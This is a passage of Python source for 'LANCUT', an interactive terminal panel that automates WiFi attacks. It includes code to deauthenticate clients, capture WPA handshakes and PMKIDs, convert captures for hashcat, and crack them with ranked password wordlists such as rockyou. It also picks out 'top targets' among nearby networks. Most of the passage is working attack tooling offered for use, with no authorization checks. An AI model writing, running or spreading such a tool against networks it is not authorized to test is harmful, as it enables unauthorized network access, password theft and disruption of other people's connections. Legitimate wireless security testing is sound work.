         f"({_fmt_size(sum(os.path.getsize(w) for w in wordlists))} total)")

    tools = state["tools"]
    # Prefer hashcat on a converted .hc22000 (it stacks multiple wordlists).
    if tools["hashcat"] and tools["hcxpcapngtool"]:
        hc = convert_to_hc22000(cap, tools)
        if hc:
            info("launching hashcat (mode 22000) — Ctrl-C to stop ...")
            subprocess.run(["hashcat", "-m", "22000", hc, *wordlists])
            got = subprocess.run(["hashcat", "-m", "22000", hc, "--show"],
                                 capture_output=True, text=True)
            if got.stdout.strip():
                ok("cracked:")
                print(got.stdout.strip())
            else:
                warn("not cracked with the selected wordlist(s)")
            ask("press Enter to return to the panel", default="")
            return
    if tools["aircrack-ng"]:
        # aircrack-ng takes a comma-separated list of wordlists.
        info("launching aircrack-ng ...")
        subprocess.run(["aircrack-ng", "-w", ",".join(wordlists), cap])
    else:
        warn("no cracking engine available (install hashcat or aircrack-ng)")
    ask("press Enter to return to the panel", default="")


def do_pmkid(state):
    """Clientless PMKID capture via hcxdumptool (if installed)."""
    if not state["tools"]["hcxdumptool"]:
        warn("hcxdumptool is not installed — PMKID capture is unavailable.")
        info("install it with:  "
             f"{DIM}sudo pacman -S hcxdumptool hcxtools{RESET}")
        info("PMKID pulls key material straight from an AP with NO client "
             "needed (works on many routers, not all).")
        ask("press Enter to return to the panel", default="")
        return
    secs = ask_int("PMKID capture seconds (15-120)", 15, 120)
    out = os.path.join(state["workdir"],
                       f"pmkid_{datetime.now():%Y%m%d_%H%M%S}.pcapng")
    info(f"running hcxdumptool for {secs}s — Ctrl-C to stop ...")
    proc = subprocess.Popen(
        ["hcxdumptool", "-i", state["iface"], "-w", out,
         "--enable_status=1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    try:
        for r in range(secs, 0, -1):
            print(f"\r  {DIM}capturing PMKIDs… {r:3d}s{RESET}  ",
                  end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        print()
        _stop(proc)
    if os.path.exists(out) and os.path.getsize(out) > 0:
        ok(f"saved: {BOLD}{out}{RESET}")
        convert_to_hc22000(out, state["tools"])
    else:
        warn("no PMKID data captured")
    ask("press Enter to return to the panel", default="")


WORDLIST_DIRS = [
    "/usr/share/wordlists",
    "/usr/share/seclists/Passwords",
    "/usr/share/seclists/Passwords/WiFi-WPA",
    "/usr/share/seclists",
    "/usr/share/dict",
    "/usr/share/john",
    "/usr/share/hashcat",
    os.path.expanduser("~/wordlists"),
    os.path.expanduser("~/Downloads"),
]
WORDLIST_EXT = (".txt", ".lst", ".dict", ".words", ".gz")


def _wpa_fraction(path, sample=400):
    """Fraction of the first `sample` entries that are WPA-valid (>=8 chars)."""
    if path.endswith(".gz"):
        return None
    try:
        good = total = 0
        with open(path, encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                total += 1
                if len(line.rstrip("\n")) >= 8:
                    good += 1
                if total >= sample:
                    break
        return good / total if total else None
    except OSError:
        return None


def _wordlist_score(path, size):
    """Rank a wordlist for WPA cracking — higher = try sooner."""
    name = os.path.basename(path).lower()
    full = path.lower()
    score = 0.0
    # Strong positives: purpose-built for WiFi / well-known password lists.
    if any(k in name for k in ("wpa", "wifi", "handshake", "wps", "router")):
        score += 1000
    if name == "rockyou.txt":
        score += 1100                    # the canonical full list — top pick
    elif "rockyou" in name and re.search(r"rockyou-?\d", name):
        score += 300                     # truncated samples: keep, but lower
    elif "rockyou" in name:
        score += 800
    if any(k in name for k in ("probable", "top", "common", "best", "most",
                               "10k", "million", "100000", "darkweb")):
        score += 400
    if any(k in name for k in ("password", "passwd", "pass", "cred", "leaked")):
        score += 250
    # Negatives: these aren't passphrase lists.
    if any(k in full for k in ("username", "/users", "-users", "/dns",
                               "subdomain", "/discovery", "web-content",
                               "directory", "fuzz", "payload", "/sql", "xss",
                               "/api", "web-shells", "/fuzzing")):
        score -= 1200
    if any(k in name for k in ("dutch", "french", "german", "spanish",
                               "italian", "portuguese", "language")):
        score -= 150
    # Count-prefixed lists ("123 password") crack poorly as-is.
    if "withcount" in name or "-count" in name:
        score -= 600
    # WPA length suitability (cheap content sample).
    frac = _wpa_fraction(path)
    if frac is not None:
        score += (frac - 0.5) * 300     # mostly >=8 chars -> boost
    # Mild tie-break: within a tier, smaller lists finish faster.
    score -= min(size, 5_000_000_000) / 5_000_000_000 * 40
    return score


def find_wordlists():
    """Scan common locations. Returns [(path, size)] ranked best-first for WPA."""
    found = {}
    for d in WORDLIST_DIRS:
        if not os.path.isdir(d):
            continue
        for root, _dirs, files in os.walk(d):
            for f in files:
                low = f.lower()
                if low.endswith(WORDLIST_EXT) or "rockyou" in low:
                    p = os.path.join(root, f)
                    try:
                        found[p] = os.path.getsize(p)
                    except OSError:
                        pass
    # Best WPA candidate first, size as a secondary tie-break.
    return sorted(found.items(),
                  key=lambda kv: (_wordlist_score(*kv), kv[1]), reverse=True)


def _fmt_size(n):
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024 or unit == "GB":
            return f"{n:.0f}{unit}" if unit == "B" else f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}GB"


def crack_set(mode, ranked=None):
    """Return an ordered list of (path, size) for a crack mode.

    quick    - top WPA/rockyou tier, bounded for speed
    balanced - quick tier plus the strongest mid-size lists
    full     - every wordlist, best-first
    """
    ranked = ranked if ranked is not None else find_wordlists()
    if mode == "full":
        return list(ranked)
    scored = [(p, s, _wordlist_score(p, s)) for p, s in ranked]
    if mode == "quick":
        # Only the proven fast winners: positive score, cap count + size.
        picked, budget = [], 400 * 1024 * 1024
        for p, s, sc in scored:
            if sc <= 0 or len(picked) >= 12:
                break
            picked.append((p, s))
            budget -= s
            if budget <= 0:
                break
        return picked or [(p, s) for p, s, _ in scored[:5]]
    # balanced
    picked, budget = [], 3 * 1024 * 1024 * 1024
    for p, s, sc in scored:
        if sc <= -200 or len(picked) >= 60:
            break
        picked.append((p, s))
        budget -= s
        if budget <= 0:
            break
    return picked


def do_wordlists(state):
    wls = find_wordlists()
    print()
    if not wls:
        warn("no wordlists found in the usual locations")
        info("searched: " + ", ".join(d for d in WORDLIST_DIRS
                                      if os.path.isdir(d)) or "(none exist)")
        info("get one with:  "
             f"{DIM}sudo pacman -S wordlists  # or seclists{RESET}")
        ask("press Enter to return to the panel", default="")
        return None

    paths = [p for p, _ in wls]
    total = sum(s for _, s in wls)
    # Optional filter so huge lists stay browsable.
    flt = ask(f"filter by name (Enter = show all {len(wls)})",
              default="").strip().lower()
    if flt:
        wls = [(p, s) for p, s in wls if flt in os.path.basename(p).lower()]
        paths = [p for p, _ in wls]
        if not wls:
            warn(f"no wordlists matching '{flt}'")
            ask("press Enter to return to the panel", default="")
            return None

    print(f"\n  {NEON_PINK}▌{RESET} {NEON_CYAN}WORDLISTS{RESET}  "
          f"{GHOST}({len(wls)} shown · {_fmt_size(total)} total · "
          f"{NEON_GREEN}ranked best-first for WPA{GHOST}){RESET}\n")
    print(f"    {BOLD}{'#':>3}  {'SIZE':>8}  WORDLIST{RESET}")
    for i, (p, size) in enumerate(wls, 1):
        gz = f" {NEON_YELLOW}[gz]{RESET}" if p.endswith(".gz") else ""
        print(f"    {NEON_CYAN}{i:>3}{RESET}  {GHOST}{_fmt_size(size):>8}{RESET}"
              f"  {NEON_PURPLE}{os.path.basename(p)}{RESET}{gz}  "
              f"{GHOST}{os.path.dirname(p)}{RESET}")

    print(f"\n  {GHOST}select: {RESET}{NEON_CYAN}#{RESET}{GHOST} one · "
          f"{RESET}{NEON_CYAN}1,3,5{RESET}{GHOST} several · "
          f"{RESET}{NEON_CYAN}1-9{RESET}{GHOST} range · "
          f"{RESET}{NEON_GREEN}a{RESET}{GHOST} ALL · "
          f"{RESET}Enter back{GHOST}{RESET}")
    pick = ask("select", default="").strip().lower()
    chosen = _parse_selection(pick, paths)
    if not chosen:
        ask("press Enter to return to the panel", default="")
        return None
    if len(chosen) == 1:
        ok(f"selected: {BOLD}{chosen[0]}{RESET}")
    else:
        ok(f"selected {BOLD}{len(chosen)}{RESET} wordlists "
           f"({_fmt_size(sum(os.path.getsize(c) for c in chosen))})")
    ask("press Enter to return to the panel", default="")
    return chosen if len(chosen) > 1 else chosen[0]


def _parse_selection(pick, paths):
    """Turn '#', '1,3', '1-9', or 'a' into a list of selected paths."""
    if not pick:
        return []
    if pick in ("a", "all", "*"):
        return list(paths)
    idxs = set()
    for part in pick.replace(" ", "").split(","):
        if "-" in part:
            try:
                lo, hi = part.split("-")
                idxs.update(range(int(lo), int(hi) + 1))
            except ValueError:
                continue
        elif part.isdigit():
            idxs.add(int(part))
    return [paths[i - 1] for i in sorted(idxs) if 1 <= i <= len(paths)]


def do_list(state):
    caps = list_captures(state["workdir"])
    if not caps:
        warn("no captures yet")
    else:
        info(f"{len(caps)} capture file(s) in {state['workdir']}:")
        for c in caps:
            size = os.path.getsize(c) // 1024
            print(f"    {os.path.basename(c):<42} {DIM}{size} KB{RESET}")
    ask("press Enter to return to the panel", default="")


def _set_theme(state):
    names = list(THEMES)
    print(f"\n  {NEON_PINK}▌{RESET} {NEON_CYAN}THEME{RESET}")
    for i, n in enumerate(names, 1):
        pk, cy, pu = THEMES[n][0], THEMES[n][1], THEMES[n][2]
        swatch = (f"{_rgb(*pk)}██{_rgb(*cy)}██{_rgb(*pu)}██{RESET}")
        cur = f"  {NEON_GREEN}◀ current{RESET}" if n == state["theme"] else ""
        print(f"    {BOLD}{i}{RESET}  {swatch}  {n}{cur}")
    pick = ask("theme number", default="")
    if pick.isdigit() and 1 <= int(pick) <= len(names):
        state["theme"] = names[int(pick) - 1]
        set_theme(state["theme"])
        ok(f"theme set to {state['theme']}")


def _set_band(state):
    five = phy_has_5ghz(iface_phy(state["iface"]))
    info(f"5 GHz on this card: "
         f"{(GREEN + 'yes') if five else (RED + 'no (2.4 GHz only)')}{RESET}")
    bands = {"1": ("bg", "2.4 GHz"), "2": ("a", "5 GHz"),
             "3": ("abg", "both")}
    print(f"    {BOLD}1{RESET} 2.4 GHz   {BOLD}2{RESET} 5 GHz   "
          f"{BOLD}3{RESET} both")
    pick = ask("scan band", default="1")
    if pick in bands:
        if "a" in bands[pick][0] and not five:
            warn("this card has no 5 GHz radio — keeping 2.4 GHz")
        else:
            state["band"] = bands[pick][0]
            ok(f"scan band set to {bands[pick][1]}")


def do_settings(state):
    """Full customization submenu."""
    while True:
        _clear_screen()
        band_name = {"bg": "2.4GHz", "a": "5GHz", "abg": "2.4+5GHz"}.get(
            state["band"], "2.4GHz")
        _top()
        _row(f"{NEON_PINK}{BOLD}⚙ SETTINGS{RESET}",
             f"{GHOST}customize LANCUT{RESET}")
        _sep()
        _row(f"{NEON_CYAN}1{RESET} Theme",
             f"{NEON_PURPLE}{state['theme']}{RESET}")
        _row(f"{NEON_CYAN}2{RESET} Scan band",
             f"{NEON_PURPLE}{band_name}{RESET}")
        _row(f"{NEON_CYAN}3{RESET} Boot animation",
             f"{(NEON_GREEN+'on') if state['animate'] else (GHOST+'off')}{RESET}")
        _row(f"{NEON_CYAN}4{RESET} Scan duration",
             f"{NEON_PURPLE}{state['scan_secs']}s{RESET}")
        _row(f"{NEON_CYAN}5{RESET} Sweep per-channel",
             f"{NEON_PURPLE}{state['dwell']}s{RESET}")
        _row(f"{NEON_CYAN}6{RESET} Active discovery",
             f"{(NEON_GREEN+'on') if state['active'] else (GHOST+'off')}{RESET}")
        _row(f"{NEON_CYAN}7{RESET} Capture timeout",
             f"{NEON_PURPLE}{state['cap_timeout']}s{RESET}")
        _row(f"{NEON_CYAN}8{RESET} Deauth bursts/round",
             f"{NEON_PURPLE}{state['deauth_burst']}{RESET}")
        _row(f"{NEON_CYAN}9{RESET} Output directory",
             f"{GHOST}…{state['workdir'][-20:]}{RESET}")
        _row(f"{NEON_CYAN}0{RESET} Reset to defaults")
        _sep()
        _row(f"{NEON_CYAN}b{RESET} Back to panel")
        _bot()
        pick = ask("settings", default="b").strip().lower()

        if pick == "1":
            _set_theme(state)
        elif pick == "2":
            _set_band(state)
        elif pick == "3":
            state["animate"] = not state["animate"]
        elif pick == "4":
            state["scan_secs"] = ask_int("scan duration (5-120)", 5, 120,
                                         default=state["scan_secs"])
        elif pick == "5":
            state["dwell"] = ask_int("seconds per channel (2-30)", 2, 30,
                                     default=state["dwell"])
        elif pick == "6":
            state["active"] = not state["active"]
        elif pick == "7":
            state["cap_timeout"] = ask_int("capture timeout (15-600)", 15, 600,
                                           default=state["cap_timeout"])
        elif pick == "8":
            state["deauth_burst"] = ask_int("deauth bursts per round (1-64)",
                                            1, 64, default=state["deauth_burst"])
        elif pick == "9":
            newdir = ask("output directory", default=state["workdir"])
            try:
                os.makedirs(newdir, exist_ok=True)
                state["workdir"] = os.path.abspath(newdir)
                ok(f"output → {state['workdir']}")
            except OSError as e:
                warn(f"can't use that directory: {e}")
            ask("press Enter", default="")
        elif pick == "0":
            state.update(DEFAULT_SETTINGS)
            set_theme(state["theme"])
            ok("settings reset to defaults")
            ask("press Enter", default="")
        elif pick in ("b", ""):
            if save_settings(state):
                ok(f"settings saved → {DIM}{CONFIG_PATH}{RESET}")
            return


# ─── panel helpers ───────────────────────────────────────────────────────────
_ANSI = re.compile(r"\033\[[0-9;]*m")
PANEL_W = 54


def _vlen(s):
    """Visible length of a string, ignoring ANSI color codes."""
    return len(_ANSI.sub("", s))


_FRAME = NEON_PURPLE   # border color (kept in sync by set_theme)


def _top():
    print(f"{_FRAME}  ╔{'═' * PANEL_W}╗{RESET}")


def _bot():
    print(f"{_FRAME}  ╚{'═' * PANEL_W}╝{RESET}")


def _sep():
    print(f"{_FRAME}  ╟{'─' * PANEL_W}╢{RESET}")


def _row(left="", right=""):
    """Print one framed row with optional left- and right-aligned text."""
    gap = PANEL_W - 2 - _vlen(left) - _vlen(right)
    line = f" {left}{' ' * max(1, gap)}{right} "
    # pad to exact width in case of overflow
    line += " " * max(0, PANEL_W - _vlen(line))
    print(f"{_FRAME}  ║{RESET}{line}{_FRAME}║{RESET}")


def _bar_row(label):
    """A neon section header row with a leading glow block."""
    _row(f"{NEON_CYAN}▌{RESET} {NEON_PINK}{BOLD}{label}{RESET}")


def _signal_bars(power):
    """Render a 4-step signal meter from a dBm string (-30 strong … -90 weak)."""
    glyphs = "▁▃▅▇"
    try:
        p = int(power)
    except (ValueError, TypeError):
        return f"{GHOST}····{RESET}"
    # map -90..-40 dBm -> 0..4 bars
    level = max(0, min(4, int((p + 90) / 12)))
    colors = [RED, NEON_YELLOW, NEON_YELLOW, NEON_GREEN, NEON_GREEN]
    col = colors[level]
    filled = "".join(glyphs[min(i, 3)] for i in range(level))
    empty = f"{GHOST}{'·' * (4 - level)}{RESET}"
    return f"{col}{filled}{RESET}{empty}"


def panel(state):
    """Draw the main control panel and return the chosen action key."""
    _clear_screen()
    inj = state["injection"]
    if inj is True:
        inj_badge = f"{GREEN}● working{RESET}"
    elif inj is False:
        inj_badge = f"{RED}● not working{RESET}"
    else:
        inj_badge = f"{DIM}● untested{RESET}"

    naps = len(state["aps"])
    ncli = len(state["stations"])
    wd = state["workdir"]
    if _vlen(wd) > 34:
        wd = "…" + wd[-33:]

    tools = state["tools"]
    band_name = {"bg": "2.4GHz", "a": "5GHz", "abg": "2.4+5GHz"}.get(
        state.get("band", "bg"), "2.4GHz")
    ncap = len(list_captures(state["workdir"]))

    def item(key, label, note, lit=True):
        tag = f"{NEON_CYAN}{BOLD}{key}{RESET}" if lit else f"{GHOST}{key}{RESET}"
        lbl = label if lit else f"{GHOST}{label}{RESET}"
        nt = f"{GHOST}{note}{RESET}" if lit else f"{RED}{note}{RESET}"
        _row(f" {tag} {NEON_PURPLE}▸{RESET} {lbl}", nt)

    _top()
    _row(f"{NEON_PINK}{BOLD}⚡ LANCUT{RESET}",
         f"{NEON_GREEN}◉ LIVE{RESET}")
    _sep()
    _row(f"{GHOST}interface{RESET}  {NEON_CYAN}{BOLD}{state['iface']}{RESET}  "
         f"{GHOST}({band_name}){RESET}", f"{GHOST}injection{RESET} {inj_badge}")
    _row(f"{GHOST}networks{RESET}   {NEON_GREEN}{naps}{RESET} APs {GHOST}·{RESET} "
         f"{NEON_GREEN}{ncli}{RESET} clients",
         f"{NEON_YELLOW}{ncap}{RESET} {GHOST}captures{RESET}")
    _row(f"{GHOST}output{RESET}     {GHOST}{wd}{RESET}")
    _sep()
    _bar_row("RECON")
    item("1", "Scan networks", "live map, all APs")
    item("4", "Test injection", "card capability")
    _sep()
    _bar_row("ATTACK")
    item("2", "Capture handshake", "WPA 4-way")
    item("3", "Deauth target", "disconnect only")
    item("5", "PMKID capture",
         "clientless" if tools["hcxdumptool"] else "needs hcxdumptool",
         lit=tools["hcxdumptool"])
    _sep()
    _bar_row("CRACK")
    item("6", "Convert → hashcat",
         ".hc22000" if tools["hcxpcapngtool"] else "needs hcxtools",
         lit=tools["hcxpcapngtool"])
    item("7", "Crack capture",
         "hashcat" if tools["hashcat"] else
         ("aircrack" if tools["aircrack-ng"] else "no engine"),
         lit=tools["hashcat"] or tools["aircrack-ng"])
    item("8", "List captures", "browse files")
    item("w", "Wordlists", "find on disk")
    _sep()
    item("s", "Settings", "interface · band")
    item("q", "Quit", "exit")
    _bot()

    # Quick preview of the strongest targets from the last scan.
    if state["aps"]:
        counts = {}
        for s in state["stations"]:
            counts[s["bssid"].upper()] = counts.get(s["bssid"].upper(), 0) + 1
        wpa = [a for a in state["aps"] if "WPA" in a["privacy"]]
        for a in wpa:
            a["clients"] = counts.get(a["bssid"].upper(), 0)
        wpa.sort(key=lambda a: (a["clients"] > 0, _ap_power(a)), reverse=True)
        print(f"\n  {NEON_PINK}▌{RESET} {NEON_CYAN}TOP TARGETS{RESET}")
        for a in wpa[:3]:
            tag = f"{NEON_GREEN}{a['clients']}c{RESET}" if a["clients"] \
                else f"{GHOST}0c{RESET}"
            bars = _signal_bars(a["power"])
            print(f"    {bars} {GHOST}{a['power']:>4}dBm{RESET}  {tag:>3}  "
                  f"{GHOST}ch{a['channel']:>2}{RESET}  "
                  f"{NEON_PURPLE}{a['essid']}{RESET}")
    print()
    prompt = (f"{NEON_GREEN}┌─[{RESET}{NEON_PINK}root{RESET}"
              f"{NEON_GREEN}@{RESET}{NEON_CYAN}wpa-panel{RESET}"
              f"{NEON_GREEN}]{RESET}\n"
              f"{NEON_GREEN}└─▶{RESET} ")
    try:
        return input(prompt).strip().lower()
    except EOFError:
        return "q"


def do_scan(state):
    secs = ask_int("scan duration in seconds (5-120)", 5, 120,
                   default=state["scan_secs"])
    aps, _ = scan(state["iface"], secs, state["workdir"],
                  band=state.get("band", "bg"))
    if not aps:
        warn("no access points found — try a longer scan or move closer")
        return
    per_ch = ask_int("seconds per channel for client sweep (2-30)", 2, 30,
                     default=state["dwell"])
    active = ask("active discovery? deauth to reveal idle clients [y/N]",
                 default="y" if state["active"] else "n").lower().startswith("y")
    if active and state["injection"] is False:
        warn("injection isn't working on this card — active discovery can't "
             "transmit, falling back to passive.")
        active = False
    info("sweeping every channel for the full client list "
         "(Ctrl-C to stop early) ...")
    aps, stations = deep_client_sweep(state["iface"], aps, state["workdir"],
                                      per_channel=per_ch, active=active)
    state["aps"], state["stations"] = aps, stations
    ok(f"scan complete: {len(aps)} APs, {len(stations)} clients")
    ask("press Enter to return to the panel", default="")


def pick_target(state, focus_seconds=20):
    """Ensure a scan exists, then pick an AP and a client. Returns (ap, client)."""
    if not state["aps"]:
        warn("no scan yet — running one first")
        do_scan(state)
        if not state["aps"]:
            return None, None
    while True:
        ap = choose_ap(state["aps"], state["stations"])
        clients = [s for s in state["stations"]
                   if s["bssid"].upper() == ap["bssid"].upper()]
        if not clients:
            warn("no clients seen on this AP during the scan.")
            nxt = ask("[r]e-scan this AP, [o]ther AP, or [b]roadcast?",
                      default="r").lower()
            if nxt.startswith("r"):
                clients = enumerate_clients(iface=state["iface"], ap=ap,
                                            seconds=focus_seconds,
                                            workdir=state["workdir"])
            elif nxt.startswith("o"):
                continue
        return ap, choose_client(clients)


def do_capture(state):
    ap, client = pick_target(state)
    if ap is None:
        return
    print()
    info(f"target : {BOLD}{ap['essid']}{RESET} ({ap['bssid']}, ch {ap['channel']})")
    info(f"client : {BOLD}{client}{RESET}")
    timeout = ask_int("capture timeout in seconds (15-600)", 15, 600,
                      default=state["cap_timeout"])
    cap_file = capture_handshake(state["iface"], ap, client, timeout,
                                 state["workdir"], burst=state["deauth_burst"])
    print()
    if cap_file and has_handshake(cap_file, ap["bssid"]):
        ok(f"saved: {BOLD}{cap_file}{RESET}")
        info("verify with:  "
             f"{DIM}aircrack-ng -b {ap['bssid']} {cap_file}{RESET}")
    elif cap_file:
        warn(f"capture file written ({cap_file}) but no handshake inside")
    else:
        warn("no capture produced")
    ask("press Enter to return to the panel", default="")


def do_deauth(state):
    ap, client = pick_target(state)
    if ap is None:
        return
    print()
    info(f"target : {BOLD}{ap['essid']}{RESET} ({ap['bssid']}, ch {ap['channel']})")
    info(f"client : {BOLD}{client}{RESET}")
    dur = ask_int("duration in seconds (0 = until Ctrl-C, max 600)", 0, 600,
                  default=0)
    deauth_only(state["iface"], ap, client, dur)
    ask("press Enter to return to the panel", default="")


# ─── main ────────────────────────────────────────────────────────────────────
def main():
    cfg = load_settings()
    set_theme(cfg["theme"])
    banner(animate=cfg["animate"])
    preflight()

    # Default the capture dir to the saved one (falls back to ./captures).
    default_dir = cfg.get("workdir", "captures") or "captures"
    workdir = os.path.abspath(ask("capture/output directory",
                                  default=default_dir))
    os.makedirs(workdir, exist_ok=True)

    iface = select_interface()

    with MonitorMode(iface) as mon:
        state = {
            "iface": mon.iface,        # monitor iface (may be wlan0mon)
            "aps": [],
            "stations": [],
            "injection": None,
            "tools": detect_tools(),
            **cfg,                     # saved theme, band, defaults, workdir…
            "workdir": workdir,        # prompt wins over saved workdir
        }
        set_theme(state["theme"])
        state["injection"] = injection_test(mon.iface)
        ask("press Enter to open the panel", default="")

        def do_inject(s):
            s["injection"] = injection_test(s["iface"])
            ask("press Enter to return to the panel", default="")

        actions = {
            "1": do_scan, "2": do_capture, "3": do_deauth,
            "4": do_inject, "5": do_pmkid, "6": do_convert,
            "7": do_crack, "8": do_list, "w": do_wordlists,
            "s": do_settings,
        }
        while True:
            choice = panel(state)
            if choice in ("q", "quit", "exit"):
                break
            action = actions.get(choice)
            if action:
                try:
                    action(state)
                except KeyboardInterrupt:
                    print()
                    warn("action interrupted")
                    ask("press Enter to return to the panel", default="")
            else:
                warn("unknown choice")


if __name__ == "__main__":
    # Ensure Ctrl-C unwinds the `with` block so the card is always restored.
    signal.signal(signal.SIGINT, signal.default_int_handler)
    try:
        main()
    except KeyboardInterrupt:
        print()
        warn("interrupted")
    except Exception as exc:  # noqa: BLE001
        err(str(exc))
        sys.exit(1)
